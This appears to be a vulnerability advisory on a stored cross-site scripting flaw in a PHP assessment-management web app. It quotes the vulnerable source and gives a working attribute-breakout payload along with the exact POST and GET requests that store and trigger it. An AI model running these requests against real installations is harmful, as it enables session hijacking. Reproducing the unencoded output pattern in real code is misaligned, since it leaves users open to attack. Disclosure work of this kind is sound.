## ASSESSMENT MANAGEMENT IN PHP WITH SOURCE CODE admin/add-user.php Stored XSS Vulnerability

### I. Vulnerability Impact

Anyone able to submit the add-user form can inject arbitrary HTML/JavaScript into the `level` field, which is stored in the `users.level` column without HTML encoding. The stored script is later rendered raw in `add-mark.php`'s "Study Level" input, resulting in persistent (stored) cross-site scripting whenever any user opens the affected student's marking page, enabling session hijacking or phishing.

### II. Source Code Analysis

**Sink at write time — `admin/add-user.php`.** The `level` parameter is only passed through `mysqli_real_escape_string()`, which escapes SQL special characters but leaves `<`, `>` and `/` untouched, and is then inserted into the `users` table (only when `rank == 'one'`):

```php
if($rank1 == 'one') {
    $level1 = mysqli_real_escape_string($conn, $_REQUEST['level']);
}
else {
    $level1 = "0";
}

if($rank1 == 'one') {
    $query = "INSERT INTO users (id, name, surname, email, username, password, rank, level) VALUES ('" . $uid . "', '" . $name1 . "', '" . $sname1 . "', '" . $email1 . "', '" . $username1 . "', '" . $password1 . "', 'student', '" . $level1 . "')";
}
```

**Sink at read time — `admin/add-mark.php`** (identical copies exist at `lecturer/add-mark.php` and `supervisor/add-mark.php`). The stored `level` is read from the database and printed into a `value` attribute without `htmlspecialchars()` or `strip_tags()`:

```php
while($row = mysqli_fetch_array($result)) {
    $name = $row['name'];
    $sname = $row['surname'];
    $level = $row['level'];
}
...
<input class="form-control" type="text" id="study" name="study" value="<?php if (isset($_GET['id'])) { print $level; }?>" readonly>
```

This is a second-order (stored) XSS: the payload enters through `add-user.php`, persists in the `users.level` column, and is later reflected into the page by `add-mark.php`.

### III. Payload

The stored payload written into the `level` field is:

```
"><sCrIpT>alert(99)</ScRiPt>
```

Why the request payload `<sCrIpT>alert(99)</ScRiPt>` (without the leading `">`) does not execute: it is stored correctly, but it is printed inside a `value="..."` attribute, so the `<` and `>` characters stay inside the attribute value and no script tag is formed. Closing the attribute with `">` first is required. `mysqli_real_escape_string()` turns the `"` into `\"`, but the backslash has no escaping meaning in HTML, so the quote still closes the `value` attribute and the script runs.

Step 1 — store the payload (add a user with `rank=one`):

```http
POST /admin/add-user.php HTTP/1.1
Host: assessment
Content-Type: application/x-www-form-urlencoded

name=zxc&sname=zxc&email=zxc%40qq.com&password=pass&rank=one&level=%22%3E%3CsCrIpT%3Ealert(99)%3C%2FScRiPt%3E&submit=Add+User
```

Step 2 — trigger (open the marking page for the created student; `add-user.php` sets `username` equal to the submitted `email`, i.e. `zxc@qq.com`):

```http
GET /admin/add-mark.php?id=zxc@qq.com HTTP/1.1
Host: assessment
```

Server response — the stored value breaks out of the `value` attribute:

```html
<input class="form-control" type="text" id="study" name="study" value="\"><sCrIpT>alert(99)</ScRiPt>" readonly>
```

The `\"` closes the `value` attribute in the HTML context, so `<sCrIpT>alert(99)</ScRiPt>` is parsed as a script element and `alert(99)` executes.

### IV. Source Download

https://code-projects.org/assessment-management-in-php-with-source-code/



![image-20260824100936904](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260824100936904.png)
